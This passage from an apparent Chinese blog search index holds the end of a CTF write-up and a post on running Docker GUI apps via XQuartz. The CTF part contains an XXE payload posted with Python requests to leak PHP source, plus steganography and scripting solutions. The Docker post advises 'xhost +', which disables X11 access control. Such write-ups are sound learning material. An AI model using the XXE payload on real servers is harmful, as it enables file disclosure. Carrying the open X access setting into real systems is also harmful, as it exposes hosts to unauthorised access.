class="string">"requests"</span>).post(<span class="string">"http://&lt;ip&gt;:&lt;port&gt;/&lt;题目文件名&gt;"</span>, data=&#123;<span class="string">"name"</span>:<span class="string">'&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root SYSTEM "tmp.dtd"&gt;&lt;root&gt;&amp;test;&lt;/root&gt;'</span>&#125;).content</span><br></pre></td></tr></table></figure><p>将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。</p><h2 id="0x23-ScriptBoy"><a href="#0x23-ScriptBoy" class="headerlink" title="0x23 ScriptBoy"></a>0x23 ScriptBoy</h2><p><a href="https://pan.baidu.com/s/1PtDSpJT8eXlDjw6voKYaig" target="_blank" rel="noopener">文件包</a> 提取码: gxfa</p><p><strong>题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值</strong></p><p>分析文件结构后可以用如下脚本构造 Flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">filename = <span class="string">"./"</span>+str(i)+<span class="string">"/"</span>+str(i)+<span class="string">".txt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> content:</span><br><span class="line">split_tmp = tmp.split(<span class="string">'----'</span>)</span><br><span class="line"><span class="keyword">if</span> len(split_tmp[<span class="number">0</span>])==len(split_tmp[<span class="number">1</span>])==<span class="number">4</span>:</span><br><span class="line">result.append(tmp[<span class="number">19</span>])</span><br><span class="line"></span><br><span class="line">print(md5(<span class="string">''</span>.join(result).encode(<span class="string">'utf8'</span>)).hexdigest())</span><br></pre></td></tr></table></figure><h2 id="0x24-ljmisc"><a href="#0x24-ljmisc" class="headerlink" title="0x24 ljmisc"></a>0x24 ljmisc</h2><p><a href="https://pan.baidu.com/s/1IJ_pA4EL53YvZChEyXsFwQ" target="_blank" rel="noopener">图片</a> 提取码: mnck</p><p>⬆️打开链接前请做好心理准备</p><p>拿到图片后，执行 <code>binwalk 1000.png</code> 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 <code>dd if=1000.png of=test.zip skip=0x8b3f4 bs=1</code> 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。</p><p>打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。</p><p>两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。</p><p>使用<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">bwm</a>处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。</p><p>解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(MAX, MAX))</span><br><span class="line"></span><br><span class="line">str = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./bin.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">str = f.read()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">'1'</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p>扫描二维码即可获取 Flag。</p><h1 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h1><p>本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。</p><p>技术上的话题就到此为止了，下面是一些题外话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在 Docker for MacOS 中运行 GUI 程序</title>
      <link href="/2019/10/14/Run-GUI-in-Docker/"/>
      <url>/2019/10/14/Run-GUI-in-Docker/</url>
      
        <content type="html"><![CDATA[<p>内容包括：前言+环境+具体操作+原理</p><a id="more"></a><h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>在初步接触了 Docker 后，突然萌生了一个“可不可以在其中跑GUI程序的念头”，遂急忙STFW&amp;&amp;RTFM，并在查阅了相关的一些文档后，成功在本地运行了容器内的GUI测试程序，下面记录一下相关的工作和原理。</p><h1 id="0x1-相关环境"><a href="#0x1-相关环境" class="headerlink" title="0x1 相关环境"></a>0x1 相关环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Docker version 18.09.2</span><br><span class="line">XQuartz 2.7.11（xorg-server 1.18.4)</span><br></pre></td></tr></table></figure><p>以上软件均可通过 <a href="https://brew.sh" target="_blank" rel="noopener">homebrew</a> 进行安装</p><h1 id="0x2-具体操作"><a href="#0x2-具体操作" class="headerlink" title="0x2 具体操作"></a>0x2 具体操作</h1><ol><li>XQuartz -&gt; 偏好设置 -&gt; 安全性 -&gt; 勾选“允许从网络客户端连接” -&gt; 退出程序；</li><li>终端键入 <code>xhost +</code>（注意两者之间的空格）重新启动 XQuartz；</li><li>使用诸如 <code>nmap</code> 类的工具查看 6000 端口是否被 X11 服务占用，如果已经被占用即可继续下一步操作，如果没有被占用的话…因为没遇到过所以我也不知道怎么办:-P；</li><li>在 run 或 exec 容器时加入<code>-e DISPLAY=host.docker.internal:0</code>参数，比如我这里通过对一个现有的，已经安装过 xarclock 时钟小程序的容器 toyOS 执行<code>docker exec -ite DISPLAY=host.docker.internal:0 toyOS /usr/bin/xarclock</code>，就会在我的本地出现一个小时钟的GUI程序；</li></ol><h1 id="0x3-相关原理"><a href="#0x3-相关原理" class="headerlink" title="0x3 相关原理"></a>0x3 相关原理</h1><p>在 Linux 系统及一些 Unix-like 系统中，有着 <a href="http://linfo.org/x.html" target="_blank" rel="noopener">X Window System</a> 的概念（下面简称为 X系统），用户的 GUI 程序作为 X Client 向本地或远程的 X Server 交互，以得到底层的支持来在运行 X Server 的设备上绘制出图像，而 <a href="https://www.xquartz.org" target="_blank" rel="noopener">XQuartz</a> 则是一款面向 MacOS 系统的 X系统，（在我理解的层面上）也提供了如上的功能支持。</p><p>于是在这个原理的支撑下，<strong>如何让 Docker 运行 GUI 程序</strong> 这个问题就被转化成了 <strong>如何在宿主机运行 X Server</strong> 以及 <strong>如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互</strong>，下面分别来解决这两个问题：</p><h2 id="0x31-如何在宿主机运行-X-Server"><a href="#0x31-如何在宿主机运行-X-Server" class="headerlink" title="0x31 如何在宿主机运行 X Server"></a>0x31 如何在宿主机运行 X Server</h2><p>在 X系统的定义中可以看到，本身该系统就可以支持以网络为基础的 C-S 模型（虽然关注点更倾向于服务方），XQuartz 作为它的一种实现当然也不例外。但是出于<a href="https://security.stackexchange.com/questions/14815/security-concerns-with-x11-forwarding" target="_blank" rel="noopener">安全上的考虑</a>，XQuartz 默认是不允许通过网络进行交互的。要关闭这个限制，有两个方面要实现，分别对应 <strong>具体操作</strong> 中的1，2两个操作，第一个操作就像字面上的意思一样，关闭了网络连接限制，第二个操作则是关闭了连接鉴定（access control），可以通过运行 <code>man xhost</code> 来查看其 Man Page 以获得更多的信息。需要注意的是，因为本次实验的操作都是在本地实现的，所以完全关闭了连接鉴定，这在涉及到远程操作时是非常不安全的。</p><p>执行了上述步骤且 6000 端口被监听（默认情况）时，我们就成功在宿主机上运行起了 X Server，接下来就要解决第三个问题了。</p><h2 id="0x32-如何让-Docker-中的-X-Client-与宿主机的-X-Server-实现交互"><a href="#0x32-如何让-Docker-中的-X-Client-与宿主机的-X-Server-实现交互" class="headerlink" title="0x32 如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互"></a>0x32 如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互</h2><p>作为 X Client 的程序如果想与 X Server 进行交互，大致分为两种方式：</p><ul><li>在命令后加 <code>--display</code> 参数并指明相关的位置</li><li>用户提前设置好环境变量 <code>DISPLAY</code> ，程序从该变量获得相关信息</li></ul><p>这里我们采用第二种方式，故在启动容器时通过 <code>-e</code> 参数为其设置 <code>DISPLAY</code> 变量，现在的问题在于，如何解释变量的值 <code>host.docker.internal:0</code> 呢？</p><p>对于该变量中，冒号前面的部分，<a href="https://docs.docker.com/docker-for-windows/networking/" target="_blank" rel="noopener">Docker 官方文档</a>中有如下解释：</p><blockquote><p>The host has a changing IP address (or none if you have no network access). From 18.03 onwards our recommendation is to connect to the special DNS name <code>host.docker.internal</code>, which resolves to the internal IP address used by the host. </p></blockquote><p>也就是说，这个值本质上是获得了宿主机的内部IP，为了验证这一点，可以通过 <code>ifconfig</code> 命令来查看宿主机实际的IP，并将 <code>DISPLAY</code> 的值换成 <code>your_ip:0</code> ，可以发现和前面一样可以运行。之所以本次实验采用了前者，是因为要获取实际IP，第一是过程很麻烦，第二是设备要处于联网的状态下，而在文档的描述中可以看到 <code>(or none if you have no network access)</code> 这句话，也就是说，这种参数设置在无网络的条件下也可以正常运行。</p><p>那么 <code>DISPLAY</code> 的值就可以被解释为 <code>your_ip:0</code> 了，关于这个格式，其实它的完整形式为 <code>your_ip: display_number. screen_number</code> ，在本实验中其实可以写为 <code>host.docker.internal:0.0</code>，<code>display_number</code> 和 <code>screen_number</code> 均从0开始计数，前者表示一个输入流的标号（输入流包括显示器，键盘，鼠标等），后者表示输入流中某个具体的显示屏，因为很少有人使用多屏幕，所以 <code>screen_number</code> 多数情况下均为0，也就可以省略掉了。</p><p>而对于 <code>display_number</code>，<a href="https://www.x.org/releases/X11R7.7/doc/xproto/x11protocol.html" target="_blank" rel="noopener">X11 protocol 官方文档</a>中有如下描述：</p><blockquote><p>For TCP connections, displays on a given host are numbered starting from 0, and the server for display N listens and accepts connections on port 6000 + N.</p></blockquote><p>也就是说，这个值实际上取决于宿主机上 X11 服务占用的端口，用端口号减掉6000即可，这就是上述命令中冒号后面的0的具体含义。为了验证这一点，可以使用 <code>socat</code> 工具运行 <code>socat tcp-listen:6100,reuseaddr,fork tcp:localhost:6000</code> 命令，将6100端口的消息转交给6000端口，这样按照上面的描述，<code>DISPLAY</code> 变量的值就可以为 <code>host.docker.internal:100</code> ，替换后执行完整命令，可以发现一样能运行GUI测试程序。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
